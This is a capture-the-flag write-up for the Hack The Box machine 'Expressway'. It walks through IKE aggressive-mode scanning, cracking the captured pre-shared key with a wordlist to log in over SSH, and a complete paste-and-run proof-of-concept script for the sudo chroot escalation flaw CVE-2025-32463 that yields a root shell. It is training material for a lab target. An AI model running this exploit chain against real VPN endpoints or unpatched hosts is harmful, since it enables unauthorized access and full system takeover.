# HTB -  Expressway

**Recon**

```jsx
nmap -sU --top-ports 100 10.129.38.98
```

PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp

4500/udp open|filtered nat-t-ike `ike-scan` often reveals vendor and supported transforms; `ike-version`/`ipsec-info` NSEs help too. This tells you whether a VPN is exposed and what implementations to research next.

```jsx
ike-scan -M 10.129.38.98
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.38.98	Main Mode Handshake returned
HDR=(CKY-R=7c636373918ce814)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.094 seconds (10.60 hosts/sec).  1 returned handshake; 0 returned notify
```

- The host is an IPsec VPN endpoint using **PSK authentication** and **legacy crypto** (3DES/SHA1/DH-1024).
- It advertises XAUTH and DPD.
- This is good reconnaissance: you now know you’re dealing with an IPsec peer and have the SA transforms to guide further investigation.

We want **Aggressive Mode**.

```jsx
ike-scan -M --aggressive 10.129.38.98

```

10.129.38.98	Aggressive Mode Handshake returned
HDR=(CKY-R=16d83618942bd4fa)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
KeyExchange(128 bytes)
Nonce(32 bytes)
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
Hash(20 bytes)

## Why this matters

- You now **know the auth method is PSK** and you have a concrete **identity string (`ike@expressway.htb`)**. In many HTB/CTF scenarios that’s all you need to try a focused PSK wordlist against the endpoint (or use it to craft a connection attempt with a VPN client).

```jsx
ike-scan -M --aggressive --id=ike@expressway.htb 10.129.38.98 --pskcrack=psk.txt
```

HDR=(CKY-R=d2a6a356e90823be)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
KeyExchange(128 bytes)
Nonce(32 bytes)
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
Hash(20 bytes)

Now hit it with a wordlist.

```jsx
psk-crack -d rockyou.txt psk.txt
```

key "freakingrockstarontheroad" matches SHA1 hash 981fe6a1ab5865a733ae11755e811f95bb871f10

<aside>
✅

key "freakingrockstarontheroad

</aside>

Then SSH

```jsx
ssh ike@10.129.38.98
password: freakingrockstarontheroad
```

and you can obtain the user flag

# **Root**

Checking sudo version:

```jsx
ike@expressway:~$ sudo--version
Sudo version 1.9.17
```

vulnerable to CVE-2025-32463

[https://github.com/pr0v3rbs/CVE-2025-32463_chwoot](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)

```jsx
nano ex.sh
```

paste this:

```jsx
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    # If no command is provided, default to an interactive root shell.
    CMD="/bin/bash"
else
    # Otherwise, use the provided arguments as the command to execute.
    CMD="$@"
fi

# Escape the command to safely include it in a C string literal.
# This handles backslashes and double quotes.
CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

```jsx
chmod +x ex.sh
./ex.sh id
./ex.sh
```

and then we got root

```jsx
cat /root/root.txt
```